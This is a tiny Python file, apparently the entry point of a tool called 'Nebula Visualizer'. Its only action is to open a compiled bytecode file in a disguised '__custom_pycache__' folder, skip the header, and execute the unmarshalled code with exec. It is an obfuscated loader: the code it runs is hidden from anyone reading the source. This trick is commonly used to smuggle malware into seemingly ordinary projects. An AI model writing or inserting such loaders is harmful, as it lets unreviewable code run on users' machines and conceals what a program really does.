
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Nebula Visualizer_78ba84b1f74146f5a8b9bb0efe8b9fe3.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
